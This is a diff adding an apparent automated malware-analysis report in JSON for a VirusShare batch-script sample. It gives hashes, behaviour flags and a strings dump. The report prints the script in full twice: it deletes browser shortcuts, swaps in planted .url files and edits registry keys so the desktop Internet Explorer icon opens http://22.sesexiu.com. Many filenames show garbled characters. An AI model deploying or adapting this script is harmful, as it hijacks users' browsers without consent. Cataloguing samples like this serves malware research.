@@ -1,0 +1,72 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command": "May run PowerShell commands",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Windows": "May enumerate application windows",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "@if \"%1\" NEQ \"BB\" (@exit)\n@copy %temp%\\360.ico %windir% /y\n@copy %temp%\\firefox.ico %windir% /y\n@copy %temp%\\maxthon.ico %windir% /y\n@copy %temp%\\TheWorld.ico %windir% /y\n@copy %temp%\\TTraveler.ico %windir% /y\n@del \"%USERPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*Inter*.*\" \"%USERPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*plorer*.*\" \"%USERPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*\ufffd\ufffd\u05b7*.*\" \"%USERPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*\ufffd\ufffd\ufffd\ufffd*.*\" \"%USERPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*\ufffd\ufffd\u04b3*.*\" /f /q\n@del \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*Inter*.*\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*plorer*.*\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*\ufffd\ufffd\u05b7*.*\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*\ufffd\ufffd\ufffd\ufffd*.*\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*\ufffd\ufffd\u04b3*.*\" /f /q\n@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*Inter*.*\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*plorer*.*\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\ufffd\ufffd\u05b7*.*\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\ufffd\ufffd\ufffd\ufffd*.*\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\ufffd\ufffd\u04b3*.*\" /f /q\n\n\n@copy \"%temp%\\\ufffd\ufffd\ufffd\ufffd Internet Explorer \ufffd\ufffd\ufffd\ufffd\ufffd.lnk\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\" /y\n@copy \"%temp%\\\ufffd\ufffd\ufffd\ufffd Internet Explorer \ufffd\ufffd\ufffd\ufffd\ufffd.lnk\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\Internet Explorer.lnk\" /y\n@reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\" /v \"{871C5380-42A0-1069-A2EA-08002B30309D}\" /f\n\n\n@if exist \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\ufffd\ufffd*.lnk\" (@del \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\ufffd\ufffd*.lnk\" /f /q\n@copy \"%temp%\\\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd2.url\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\" /y)\n@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\ufffd\ufffd\ufffd\ufffd*.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\ufffd\ufffd\ufffd\ufffd*.lnk\" /f /q\n@copy \"%temp%\\\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd2.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)\n\n\n@if exist \"%USERPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\u0476TT.lnk\" (@del \"%USERPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\u0476TT.lnk\" /f /q\n@copy \"%temp%\\\ufffd\ufffd\u0476TT.url\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\" /y)\n@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\ufffd\ufffd\u0476TT.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\ufffd\ufffd\u0476TT.lnk\" /f /q\n@copy \"%temp%\\\ufffd\ufffd\u0476TT.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)\n\n\n@if exist \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\ufffd\ufffd\u05ae\ufffd\ufffd.lnk\" (@del \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\ufffd\ufffd\u05ae\ufffd\ufffd.lnk\" /f /q\n@copy \"%temp%\\\ufffd\ufffd\ufffd\ufffd\u05ae\ufffd\ufffd.url\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\" /y)\n@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\ufffd\ufffd\ufffd\ufffd\u05ae\ufffd\ufffd.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\ufffd\ufffd\ufffd\ufffd\u05ae\ufffd\ufffd.lnk\" /f /q\n@copy \"%temp%\\\ufffd\ufffd\ufffd\ufffd\u05ae\ufffd\ufffd.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)\n\n\n@if exist \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*Firefox*.lnk\" (@del \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*Firefox*.lnk\" /f /q\n@copy \"%temp%\\Mozilla Firefox.url\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\" /y)\n@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*Firefox*.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*Firefox*.lnk\" /f /q\n@copy \"%temp%\\Mozilla Firefox.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)\n\n\n@if exist \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*\ufffd\ufffd\ufffd\ufffd\ufffd*.lnk\" (@del \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\\*\ufffd\ufffd\ufffd\ufffd\ufffd*.lnk\" /f /q\n@copy \"%temp%\\360\ufffd\ufffd\u022b\ufffd\ufffd\ufffd\ufffd\ufffd 3.url\" \"%ALLUSERSPROFILE%\\\ufffd\ufffd\ufffd\ufffd\" /y)\n@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\ufffd\ufffd\u022b\ufffd\ufffd\ufffd\ufffd\ufffd*.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\ufffd\ufffd\u022b\ufffd\ufffd\ufffd\ufffd\ufffd*.lnk\" /f /q\n@copy \"%temp%\\360\ufffd\ufffd\u022b\ufffd\ufffd\ufffd\ufffd\ufffd 3.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)\n\n\n@reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\" /v \"{871C5380-42A0-1069-A2EA-08002B30309D}\" /t REG_DWORD /d 1 /f\n\n@reg add \"HKCR\\CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\shell\\OpenHomePage\\Command\" /v \"\" /t REG_SZ /d \"%programfiles%\\Internet Explorer\\IEXPLORE.EXE http://22.sesexiu.com\" /f"
+    },
+    "filename": "VirusShare_055ec1bd89b13902e247d4f505cae391",
+    "filesize": 3650,
+    "filetype": "ISO-8859 text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "055ec1bd89b13902e247d4f505cae391",
+        "sha1": "2c6eb61bc71f3d696d94717269588e96c7a38b98",
+        "sha256": "2de4c432ada0673659d1bb9562c6bbffb4045d90dc42b0bd821c2943e64fce2b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@if \"%1\" NEQ \"BB\" (@exit)",
+            "@copy %temp%\\360.ico %windir% /y",
+            "@copy %temp%\\firefox.ico %windir% /y",
+            "@copy %temp%\\maxthon.ico %windir% /y",
+            "@copy %temp%\\TheWorld.ico %windir% /y",
+            "@copy %temp%\\TTraveler.ico %windir% /y",
+            "@del \"%USERPROFILE%\\\\*Inter*.*\" \"%USERPROFILE%\\\\*plorer*.*\" \"%USERPROFILE%\\\\*\u05b7*.*\" \"%USERPROFILE%\\\\**.*\" \"%USERPROFILE%\\\\*\u04b3*.*\" /f /q",
+            "@del \"%ALLUSERSPROFILE%\\\\*Inter*.*\" \"%ALLUSERSPROFILE%\\\\*plorer*.*\" \"%ALLUSERSPROFILE%\\\\*\u05b7*.*\" \"%ALLUSERSPROFILE%\\\\**.*\" \"%ALLUSERSPROFILE%\\\\*\u04b3*.*\" /f /q",
+            "@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*Inter*.*\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*plorer*.*\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\u05b7*.*\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\**.*\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\u04b3*.*\" /f /q",
+            "@copy \"%temp%\\ Internet Explorer .lnk\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\" /y",
+            "@copy \"%temp%\\ Internet Explorer .lnk\" \"%ALLUSERSPROFILE%\\\\Internet Explorer.lnk\" /y",
+            "@reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\" /v \"{871C5380-42A0-1069-A2EA-08002B30309D}\" /f",
+            "@if exist \"%ALLUSERSPROFILE%\\\\*.lnk\" (@del \"%ALLUSERSPROFILE%\\\\*.lnk\" /f /q",
+            "@copy \"%temp%\\2.url\" \"%ALLUSERSPROFILE%\\\" /y)",
+            "@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*.lnk\" /f /q",
+            "@copy \"%temp%\\2.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)",
+            "@if exist \"%USERPROFILE%\\\\\u0476TT.lnk\" (@del \"%USERPROFILE%\\\\\u0476TT.lnk\" /f /q",
+            "@copy \"%temp%\\\u0476TT.url\" \"%ALLUSERSPROFILE%\\\" /y)",
+            "@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\u0476TT.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\u0476TT.lnk\" /f /q",
+            "@copy \"%temp%\\\u0476TT.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)",
+            "@if exist \"%ALLUSERSPROFILE%\\\\\u05ae.lnk\" (@del \"%ALLUSERSPROFILE%\\\\\u05ae.lnk\" /f /q",
+            "@copy \"%temp%\\\u05ae.url\" \"%ALLUSERSPROFILE%\\\" /y)",
+            "@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\u05ae.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\\u05ae.lnk\" /f /q",
+            "@copy \"%temp%\\\u05ae.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)",
+            "@if exist \"%ALLUSERSPROFILE%\\\\*Firefox*.lnk\" (@del \"%ALLUSERSPROFILE%\\\\*Firefox*.lnk\" /f /q",
+            "@copy \"%temp%\\Mozilla Firefox.url\" \"%ALLUSERSPROFILE%\\\" /y)",
+            "@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*Firefox*.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*Firefox*.lnk\" /f /q",
+            "@copy \"%temp%\\Mozilla Firefox.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)",
+            "@if exist \"%ALLUSERSPROFILE%\\\\**.lnk\" (@del \"%ALLUSERSPROFILE%\\\\**.lnk\" /f /q",
+            "@copy \"%temp%\\360\u022b 3.url\" \"%ALLUSERSPROFILE%\\\" /y)",
+            "@if exist \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\u022b*.lnk\" (@del \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\*\u022b*.lnk\" /f /q",
+            "@copy \"%temp%\\360\u022b 3.url\" \"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\" /y)",
+            "@reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\" /v \"{871C5380-42A0-1069-A2EA-08002B30309D}\" /t REG_DWORD /d 1 /f",
+            "@reg add \"HKCR\\CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\shell\\OpenHomePage\\Command\" /v \"\" /t REG_SZ /d \"%programfiles%\\Internet Explorer\\IEXPLORE.EXE http://22.sesexiu.com\" /f"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://22.sesexiu.com"
+        ]
+    },
+    "time": "0:00:00.331915",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
